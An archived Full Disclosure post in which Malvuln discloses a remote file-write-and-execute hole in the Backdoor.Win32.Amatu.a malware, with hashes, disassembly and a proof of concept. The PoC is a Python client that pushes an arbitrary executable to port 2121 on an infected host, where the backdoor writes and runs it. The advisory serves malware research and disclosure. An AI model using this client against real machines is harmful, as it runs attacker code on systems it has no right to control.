---
title: Backdoor.Win32.Amatu.a / Remote Arbitrary File Write (RCE)
url: https://seclists.org/fulldisclosure/2024/Sep/56
source: Full Disclosure
date: 2024-09-30
fetch_date: 2025-10-06T18:25:55.128289
---

# Backdoor.Win32.Amatu.a / Remote Arbitrary File Write (RCE)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](55)
[By Date](date.html#56)
[![Next](/images/right-icon-16x16.png)](57)

[![Previous](/images/left-icon-16x16.png)](55)
[By Thread](index.html#56)
[![Next](/images/right-icon-16x16.png)](57)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Amatu.a / Remote Arbitrary File Write (RCE)

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Fri, 27 Sep 2024 16:21:14 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/1e2d0b90ffc23e00b743c41064bdcc6b.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Amatu.a
Vulnerability: Remote Arbitrary File Write (RCE)
Family: Amatu
Type: PE32
MD5: 1e2d0b90ffc23e00b743c41064bdcc6b
SHA256: 77fff9931013ab4de6d4be66ca4fda47be37b6f706a7062430ee8133c7521297
Vuln ID: MVID-2024-0698
Dropped files: mine.exe
Disclosure: 09/27/2024
Description: The malware listens on TCP port 2121. Third-party
adversaries who can reach an infected host, can write arbitrary
executable code to a file named "mine.exe" to SysWOW64 directory. The
mine.exe  PE file executes immediately and runs as a child of the
parent process malware. Amatu calls several Win32 APIs
"GetSystemDirectoryA", "CreateFileA" and "WriteFile" to save the
inbound code to disk. Finally, it calls "ShellExecuteA" executing the
arbitrary PE file sent by the attacker. Setup a gateway and fake DNS
sinkhole to mimic outbound internet access for the C2 or the port may
not open.

"Amatu.a" disassembly

call    ds:GetSystemDirectoryA
004A1FCB                 lea     ecx, [ebp+Source]
004A1FD1                 push    ecx             ; Source
004A1FD2                 lea     edx, [ebp+Buffer]
004A1FD8                 push    edx             ; Destination
004A1FD9                 call    strcat
004A1FDE                 add     esp, 8
004A1FE1                 push    offset aMine    ; "mine"
004A1FE6                 lea     eax, [ebp+Buffer]
004A1FEC                 push    eax             ; Destination
004A1FED                 call    strcat
004A1FF2                 add     esp, 8
004A1FF5                 push    offset aExe     ; ".exe"
004A1FFA                 lea     ecx, [ebp+Buffer]
004A2000                 push    ecx             ; Destination
004A2001                 call    strcat

004A2022                 call    ds:CreateFileA

004A206B                 call    recv
.004A2070                 mov     [ebp+nNumberOfBytesToWrite], eax
.004A2076                 cmp     [ebp+nNumberOfBytesToWrite], 0

push    eax             ; lpNumberOfBytesWritten
004A209C                 mov     ecx, [ebp+nNumberOfBytesToWrite]
004A20A2                 push    ecx             ; nNumberOfBytesToWrite
004A20A3                 lea     edx, [ebp+buf]
004A20A9                 push    edx             ; lpBuffer
004A20AA                 mov     eax, [ebp+hFile]
004A20B0                 push    eax             ; hFile
004A20B1                 call    ds:WriteFile

mov     ecx, [ebp+hFile]
004A20BF                 push    ecx             ; hObject
004A20C0                 call    ds:CloseHandle
004A20C6                 push    1               ; nShowCmd
004A20C8                 push    0               ; lpDirectory
004A20CA                 push    0               ; lpParameters
004A20CC                 lea     edx, [ebp+Buffer]
004A20D2                 push    edx             ; lpFile
004A20D3                 push    offset Operation ; "open"
004A20D8                 push    0               ; hwnd
004A20DA                 call    ds:ShellExecuteA
004A20E0                 mov     eax, [ebp+s]
004A20E3                 push    eax             ; s
004A20E4                 call    closesocket

Exploit/PoC:
1) Create a small PE file named "mine.exe", I used MASM and packed it with FSG.

"mine.exe"

include \masm32\include\masm32rt.inc
.data
HATE db "Masm32:", 0
MyReal8 REAL8 123.456
.data?
aDword dd ?
.code
start:
  invoke MessageBox, 0, chr$("DOOM!"), addr HATE, MB_OK
  mov eax, 123
  exit
end start

2) Our custom client to send "mine.exe" to the remote infected host.

from socket import *

MALWARE_HOST="x.x.x.x"
PORT=2121
DOOM="mine.exe"

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()

    print("By Malvuln");

if __name__=="__main__":
    doit()

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](55)
[By Date](date.html#56)
[![Next](/images/right-icon-16x16.png)](57)

[![Previous](/images/left-icon-16x16.png)](55)
[By Thread](index.html#56)
[![Next](/images/right-icon-16x16.png)](57)

### Current thread:

* **Backdoor.Win32.Amatu.a / Remote Arbitrary File Write (RCE)** *malvuln (Sep 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap...